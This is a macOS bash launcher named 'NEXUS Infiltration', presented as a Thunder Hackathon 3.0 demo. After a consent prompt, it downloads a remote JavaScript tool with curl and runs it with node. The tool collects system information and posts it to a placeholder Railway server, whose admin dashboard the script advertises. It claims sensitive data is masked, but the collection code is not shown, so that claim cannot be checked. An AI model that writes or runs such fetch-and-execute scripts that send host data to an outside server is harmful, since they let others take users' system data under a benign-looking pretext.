#!/bin/bash

# NEXUS Infiltration - One Click Runner (Mac)

# Colors
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color
BOLD='\033[1m'

clear

echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                                                           ║"
echo "║     ⚡ NEXUS INFILTRATION - One Click Runner             ║"
echo "║                                                           ║"
echo "║     Thunder Hackathon 3.0                                ║"
echo "║                                                           ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

echo "📋 This tool will collect system information and send it to"
echo "   our central server for the hackathon demonstration."
echo ""
echo "🔒 All sensitive data (passwords, keys, tokens) is AUTOMATICALLY MASKED"
echo ""

echo -e "${YELLOW}⚠️  By continuing, you agree to share anonymous system data${NC}"
echo "   for the purpose of this hackathon evaluation."
echo ""

read -p "Continue? (Y/n): " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]] && [[ ! -z $REPLY ]]; then
    echo "❌ Operation cancelled"
    exit 1
fi

echo ""
echo -e "${GREEN}🚀 Starting NEXUS...${NC}"

# Check if Node.js is installed
if ! command -v node &> /dev/null; then
    echo ""
    echo -e "${RED}❌ Node.js is not installed!${NC}"
    echo ""
    echo "📥 Please install Node.js from: https://nodejs.org"
    echo ""
    echo "   Or using Homebrew:"
    echo "   brew install node"
    echo ""
    echo "   After installation, run this script again."
    echo ""
    exit 1
fi

# Get Node.js version
NODE_VERSION=$(node -v)
echo -e "${GREEN}✅ Node.js found: ${NODE_VERSION}${NC}"
echo ""

# Create temporary directory
TEMP_DIR=$(mktemp -d)
cd "$TEMP_DIR"

# Determine server URL
SERVER_URL="https://your-railway-app.railway.app/api/collect"
echo "🌐 Server: $SERVER_URL"
echo ""

# Download the tool
echo "📥 Downloading NEXUS tool..."
curl -s -L -o nexus.js "https://raw.githubusercontent.com/yourusername/thunder-hackathon-3.0/main/nexus-tool/nexus.js"

if [ $? -ne 0 ]; then
    echo -e "${RED}❌ Failed to download tool${NC}"
    cd -
    rm -rf "$TEMP_DIR"
    exit 1
fi

echo -e "${GREEN}✅ Download complete${NC}"
echo ""

# Run the tool
echo "⚡ Executing NEXUS..."
echo ""
echo "─────────────────────────────────────────────────────────────"
node nexus.js --server "$SERVER_URL" --no-interactive 
EXIT_CODE=$?
echo "─────────────────────────────────────────────────────────────"
echo ""

# Cleanup
cd -
rm -rf "$TEMP_DIR"

if [ $EXIT_CODE -eq 0 ]; then
    echo ""
    echo -e "${GREEN}✅ ✅ ✅ SUCCESS! ✅ ✅ ✅${NC}"
    echo ""
    echo "📊 Your system data has been sent to the server!"
    echo ""
    echo -e "${BLUE}🔐 Admin dashboard: https://your-railway-app.railway.app/admin${NC}"
    echo ""
else
    echo ""
    echo -e "${YELLOW}⚠️  Operation completed with warnings${NC}"
    echo ""
fi

echo "Press any key to exit..."
read -n 1